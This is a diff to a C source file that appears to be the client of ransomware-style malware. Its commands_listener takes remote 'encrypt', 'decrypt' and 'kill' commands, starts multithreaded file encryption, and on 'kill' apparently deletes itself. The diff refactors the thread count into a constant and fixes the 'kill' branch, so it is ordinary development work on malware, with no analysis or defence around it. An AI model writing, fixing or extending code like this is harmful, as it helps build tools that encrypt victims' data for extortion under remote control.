@@ -1,18 +1,20 @@
 #include <stdbool.h>
-#include <arpa/inet.h>
+#include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
-#include <sys/socket.h>
 #include <unistd.h>
-#include <netinet/in.h>
 #include <pthread.h>
-#include <stdlib.h>
+#include <sys/socket.h>
 #include <sys/utsname.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 
 #include "../../headers/client.h"
 #include "../../headers/thread.h"
 #include "../../headers/watcher.h"
 #include "../../headers/globals.h"
+
+const int THREADS_NUMBER = 8;
 
 char* get_computer_model() {
     FILE *f = fopen("/sys/devices/virtual/dmi/id/product_name", "r");
@@ -50,13 +52,13 @@ void *commands_listener(void *arg) {
 
             if (strcmp(arguments[0], "encrypt") == 0) {
                 printf("start_encryption\n");
-                initialize_threads(8, true);
+                initialize_threads(THREADS_NUMBER, true);
                 encryption_active = true;
             } else if (strcmp(arguments[0], "decrypt") == 0) {
                 printf("start_decryption\n");
                 encryption_active = false;
-                initialize_threads(8, false);
-            } else if (strcmp(arguments[0], "decrypt") == 0) {
+                initialize_threads(THREADS_NUMBER, false);
+            } else if (strcmp(arguments[0], "kill") == 0) {
                 printf("kill himself\n");
                 char exe_path[1024];
 
